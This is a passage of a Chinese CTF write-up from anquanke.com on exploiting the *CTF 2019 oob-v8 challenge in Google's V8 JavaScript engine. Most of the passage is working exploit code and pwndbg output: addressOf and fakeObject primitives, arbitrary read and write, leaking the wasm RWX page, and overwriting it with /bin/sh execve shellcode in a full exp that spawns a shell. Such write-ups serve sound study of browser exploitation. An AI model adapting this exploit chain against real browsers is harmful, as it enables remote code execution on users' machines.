解决：DataView对象中的`backing_store`会指向申请的`data_buf`（`backing_store`相当于我们的elements），修改`backing_store`为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。

    
    
    var data_buf = new ArrayBuffer(8);
    var data_view = new DataView(data_buf);
    var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
    function writeDataview(addr,data){
        write64(buf_backing_store_addr, addr);
        data_view.setBigUint64(0, data, true);
        console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
    }
    

###  浏览器运行shellcode：wasm

> wasm是让JavaScript直接执行高级语言生成的机器码的一种技术。
>
>
> 使用：网站[https://wasdk.github.io/WasmFiddle/：在线将C语言直接转换为wasm并生成JS配套调用代码。（左下角选择Code](https://wasdk.github.io/WasmFiddle/%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%B0%86C%E8%AF%AD%E8%A8%80%E7%9B%B4%E6%8E%A5%E8%BD%AC%E6%8D%A2%E4%B8%BAwasm%E5%B9%B6%E7%94%9F%E6%88%90JS%E9%85%8D%E5%A5%97%E8%B0%83%E7%94%A8%E4%BB%A3%E7%A0%81%E3%80%82%EF%BC%88%E5%B7%A6%E4%B8%8B%E8%A7%92%E9%80%89%E6%8B%A9Code)
> Buffer，然后点击最上方的Build按钮，左下角生成了我们需要的wasm代码。）
>
> ![](https://p3.ssl.qhimg.com/t0181e8ef626447f429.png)
>
> 问题：wasm中只能运行数学计算、图像处理等系统无关的高级语言代码。所以不能直接在wasm中写入我们的shellcode，然后浏览器调用执行。
>
> 方案：结合漏洞将原本内存中的的wasm代码替换为shellcode，当后续调用wasm的接口时，实际上调用的就是我们的shellcode了。

步骤：

1.首先加载一段wasm代码到内存中

2.然后通过addressOf找到存放wasm的内存地址

3.接着通过任意地址写原语用shellcode替换原本wasm的代码内容

4.最后调用wasm的函数接口即可触发调用shellcode

####  寻找存放wasm代码的内存页地址

通过Function—>shared_info—>WasmExportedFunctionData—>instance，在instance+0x88的固定偏移处，就能读取到存储wasm代码的内存页起始地址。

    
    
    //test.js，用debug版本调试
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var f = wasmInstance.exports.main;
    %DebugPrint(f);
    %SystemBreak();
    
    
    
    winter@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8 
    [...]
    pwndbg> set args --allow-natives-syntax test.js 
    pwndbg> r
    [...]
    DebugPrint: 0x2c708e5dfab9: [Function] in OldSpace
     - map: 0x07f1e5ac4379 <Map(HOLEY_ELEMENTS)> [FastProperties]
     - prototype: 0x2c708e5c2109 <JSFunction (sfi = 0x84e79c8039)>
     - elements: 0x1c0c1f4c0c71 <FixedArray[0]> [HOLEY_ELEMENTS]
     - function prototype: <no-prototype-slot>
     - shared_info: 0x2c708e5dfa81 <SharedFunctionInfo 0>             <= shared_info
     - name: 0x1c0c1f4c4ae1 <String[#1]: 0>
     - formal_parameter_count: 0
     - kind: NormalFunction
    [...]
    //shared_info在Function+0x18的位置
    pwndbg> telescope 0x2c708e5dfab9-1
    00:0000│   0x2c708e5dfab8 —▸ 0x7f1e5ac4379 ◂— 0x700001c0c1f4c01
    01:0008│   0x2c708e5dfac0 —▸ 0x1c0c1f4c0c71 ◂— 0x1c0c1f4c08
    ... ↓
    03:0018│   0x2c708e5dfad0 —▸ 0x2c708e5dfa81 ◂— 0x5900001c0c1f4c09     <= here(看最左边这个03:0018)
    04:0020│   0x2c708e5dfad8 —▸ 0x2c708e5c1869 ◂— 0x1c0c1f4c0f
    05:0028│   0x2c708e5dfae0 —▸ 0x84e79c0699 ◂— 0xd100001c0c1f4c15
    06:0030│   0x2c708e5dfae8 —▸ 0x3e5b7d3c2001 ◂— or     cl, byte ptr [rdi + rbx + 0xc]
    07:0038│   0x2c708e5dfaf0 —▸ 0x1c0c1f4c0bc1 ◂— 0x1c0c1f4c01
    
    
    pwndbg> job 0x2c708e5dfa81
    0x2c708e5dfa81: [SharedFunctionInfo] in OldSpace
     - map: 0x1c0c1f4c09e1 <Map[56]>
     - name: 0x1c0c1f4c4ae1 <String[#1]: 0>
     - kind: NormalFunction
     - function_map_index: 144
     - formal_parameter_count: 0
     - expected_nof_properties: 0
     - language_mode: sloppy
     - data: 0x2c708e5dfa59 <WasmExportedFunctionData>                    <= WasmExportedFunctionData
     - code (from data): 0x3e5b7d3c2001 <Code JS_TO_WASM_FUNCTION>
     - function token position: -1
    [...]
    //WasmExportedFunctionData在SharedFunctionInfo+0x8的位置
    pwndbg> telescope 0x2c708e5dfa81-1
    00:0000│   0x2c708e5dfa80 —▸ 0x1c0c1f4c09e1 ◂— 0x700001c0c1f4c01
    01:0008│   0x2c708e5dfa88 —▸ 0x2c708e5dfa59 ◂— 0x100001c0c1f4c58    <= here(看最左边这个01:0008)
    02:0010│   0x2c708e5dfa90 —▸ 0x1c0c1f4c4ae1 ◂— 0x1c0c1f4c04
    03:0018│   0x2c708e5dfa98 —▸ 0x1c0c1f4c2a39 ◂— 0x1c0c1f4c13
    04:0020│   0x2c708e5dfaa0 —▸ 0x1c0c1f4c04d1 ◂— 0x1c0c1f4c05
    05:0028│   0x2c708e5dfaa8 ◂— 0x0
    ... ↓
    07:0038│   0x2c708e5dfab8 —▸ 0x7f1e5ac4379 ◂— 0x700001c0c1f4c01
    
    pwndbg> job 0x2c708e5dfa59
    0x2c708e5dfa59: [WasmExportedFunctionData] in OldSpace
     - map: 0x1c0c1f4c5879 <Map[40]>
     - wrapper_code: 0x3e5b7d3c2001 <Code JS_TO_WASM_FUNCTION>
     - instance: 0x2c708e5df8c1 <Instance map = 0x7f1e5ac9789>            <= instance
     - function_index: 0
    //instance在WasmExportedFunctionData+0x10的位置
    pwndbg> telescope 0x2c708e5dfa59-1
    00:0000│   0x2c708e5dfa58 —▸ 0x1c0c1f4c5879 ◂— 0x500001c0c1f4c01
    01:0008│   0x2c708e5dfa60 —▸ 0x3e5b7d3c2001 ◂— or     cl, byte ptr [rdi + rbx + 0xc]
    02:0010│   0x2c708e5dfa68 —▸ 0x2c708e5df8c1 ◂— 0x71000007f1e5ac97    <= here(看最左边这个02:0010)
    03:0018│   0x2c708e5dfa70 ◂— 0x0
    ... ↓
    05:0028│   0x2c708e5dfa80 —▸ 0x1c0c1f4c09e1 ◂— 0x700001c0c1f4c01
    06:0030│   0x2c708e5dfa88 —▸ 0x2c708e5dfa59 ◂— 0x100001c0c1f4c58
    07:0038│   0x2c708e5dfa90 —▸ 0x1c0c1f4c4ae1 ◂— 0x1c0c1f4c04
    
    
    pwndbg> telescope 0x2c708e5df8c1-1+0x88
    00:0000│   0x2c708e5df948 —▸ 0x1864fd681000 ◂— movabs r10, 0x1864fd681260 /* 0x1864fd681260ba49 */
    01:0008│   0x2c708e5df950 —▸ 0x6158a14e409 ◂— 0x71000007f1e5ac91
    02:0010│   0x2c708e5df958 —▸ 0x6158a14e679 ◂— 0x71000007f1e5acad
    03:0018│   0x2c708e5df960 —▸ 0x2c708e5c1869 ◂— 0x1c0c1f4c0f
    04:0020│   0x2c708e5df968 —▸ 0x2c708e5df9e9 ◂— 0x71000007f1e5aca1
    05:0028│   0x2c708e5df970 —▸ 0x1c0c1f4c04d1 ◂— 0x1c0c1f4c05
    ... ↓
    pwndbg> vmmap 0x1864fd681000
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x1864fd681000     0x1864fd682000 rwxp     1000 0       +0x0
    

所以，根据以上，可以编写代码自动查找该地址。

    
    
    var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
    var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
    var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
    var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
    console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));
    

整合的调试代码如下：

    
    
    // ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
    var buf = new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    // 浮点数转换为64位无符号整数
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64位无符号整数转为浮点数
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }
    // 64位无符号整数转为16进制字节串
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    // ××××××××2. addressOf和fakeObject的实现××××××××
    var obj = {"a": 1};
    var obj_array = [obj];
    var float_array = [1.1];
    var obj_array_map = obj_array.oob();//oob函数出来的就是map
    var float_array_map = float_array.oob();
    
    // 泄露某个object的地址
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(float_array_map);
        let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
        obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
        return obj_addr;
    }
    function fakeObject(addr_to_fake)
    {
        float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
        float_array.oob(obj_array_map);
        let faked_obj = float_array[0];
        float_array.oob(float_array_map); // 还原array类型以便后续继续使用
        return faked_obj;
    }
    // ××××××××3.read & write anywhere××××××××
    // 这是一块我们可以控制的内存
    var fake_array = [                //伪造一个对象
        float_array_map,
        i2f(0n),
        i2f(0x41414141n),// fake obj's elements ptr
        i2f(0x1000000000n),
        1.1,
        2.2,
    ];
    
    // 获取到这块内存的地址
    var fake_array_addr = addressOf(fake_array);
    // 将可控内存转换为对象
    var fake_object_addr = fake_array_addr - 0x30n;
    var fake_object = fakeObject(fake_object_addr);
    // 任意地址读
    function read64(addr)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        let leak_data = f2i(fake_object[0]);
        return leak_data;
    }
    // 任意地址写
    function write64(addr, data)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        fake_object[0] = i2f(data);    
    }
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var f = wasmInstance.exports.main;
    var f_addr = addressOf(f);
    console.log("[*] leak wasm_func_addr: 0x" + hex(f_addr));
    
    var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
    var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
    var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
    var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
    console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));
    %SystemBreak();
    
    
    
    pwndbg> r
    [...]
    [*] leak wasm func addr: 0x000019659b1a1fe8
    [*] leak rwx_page_addr: 0x000028c152102000
    [...]
    pwndbg> vmmap 0x000028c152102000
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x28c152102000     0x28c152103000 rwxp     1000 0       +0x0
    

成功！

####  getshell

编写getshell的部分

shellcode这里找的：<https://www.it610.com/article/1295723160905261056.htm>

    
    
    var shellcode=[
        0x6e69622fbb48f631n,
        0x5f54535668732f2fn,
        0x050fd231583b6an
    ];
    
    var data_buf = new ArrayBuffer(24);
    var data_view = new DataView(data_buf);
    var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
    
    write64(buf_backing_store_addr, rwx_page_addr);  //这里写入之前泄露的rwx_page_addr地址
    for (var i = 0; i < shellcode.length; i++)
        data_view.setBigUint64(8*i, shellcode[i], true);
    f();//调用wasm，实际调用到了shellcode
    

###  完整的exp

    
    
    // ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
    var buf = new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    // 浮点数转换为64位无符号整数
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64位无符号整数转为浮点数
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }
    // 64位无符号整数转为16进制字节串
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    // ××××××××2. addressOf和fakeObject的实现××××××××
    var obj = {"a": 1};
    var obj_array = [obj];
    var float_array = [1.1];
    var obj_array_map = obj_array.oob();//oob函数出来的就是map
    var float_array_map = float_array.oob();
    
    // 泄露某个object的地址
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(float_array_map);
        let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
        obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
        return obj_addr;
    }
    function fakeObject(addr_to_fake)
    {
        float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
        float_array.oob(obj_array_map);
        let faked_obj = float_array[0];
        float_array.oob(float_array_map); // 还原array类型以便后续继续使用
        return faked_obj;
    }
    // ××××××××3.read & write anywhere××××××××
    // 这是一块我们可以控制的内存
    var fake_array = [                //伪造一个对象
        float_array_map,
        i2f(0n),
        i2f(0x41414141n),// fake obj's elements ptr
        i2f(0x1000000000n),
        1.1,
        2.2,
    ];
    
    // 获取到这块内存的地址
    var fake_array_addr = addressOf(fake_array);
    // 将可控内存转换为对象
    var fake_object_addr = fake_array_addr - 0x30n;
    var fake_object = fakeObject(fake_object_addr);
    // 任意地址读
    function read64(addr)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        let leak_data = f2i(fake_object[0]);
        return leak_data;
    }
    // 任意地址写
    function write64(addr, data)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        fake_object[0] = i2f(data);    
    }
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var f = wasmInstance.exports.main;
    var f_addr = addressOf(f);
    console.log("[*] leak wasm_func_addr: 0x" + hex(f_addr));
    
    var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
    var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
    var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
    var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
    console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));
    
    var shellcode=[
    0x6e69622fbb48f631n,
    0x5f54535668732f2fn,
    0x050fd231583b6an
        ];
    
    var data_buf = new ArrayBuffer(24);
    var data_view = new DataView(data_buf);
    var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
    
    write64(buf_backing_store_addr, rwx_page_addr);  //这里写入之前泄露的rwx_page_addr地址
    for (var i = 0; i < shellcode.length; i++)
        data_view.setBigUint64(8*i, shellcode[i], true);
    f();
    

![](https://p4.ssl.qhimg.com/t01fdfa952d287ae630.png)

注：非root用户可以开shell，/bin/sh这个文件不是只有root才能执行，进root是提权洞存在的意义。

## 参考资料

  * 从一道CTF题零基础学V8漏洞利用：https://www.freebuf.com/vuls/203721.html（这篇知识+调试，全但是有点杂，建议进一步理解时候看）
  * 浏览器入门之starctf-OOB：https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/（这篇方便调试，建议先看，调一遍）
  * Exploiting v8: *CTF 2019 oob-v8：<https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/>
  * 2019-StarCtf-oob：<https://0xfocu5.github.io/posts/7eb4a1e6/>

## 总结

花了好久，终于弄完了，真的是，做题5分钟，环境3小时的真实写照，环境强推国外云服务器，大概需要1天时间。

v8这块做下来，还是比较好理解的，可能刚开始看有点晕，但是静下心来好好想想还是能想得通。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **b00k** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/219815](/post/id/219815)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [v8](/tag/v8)
  * [OOB](/tag/OOB)

 **+1** __10赞

 __收藏

![](https://p0.ssl.qhimg.com/t016c95a48ca48d062d.png) b00k

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

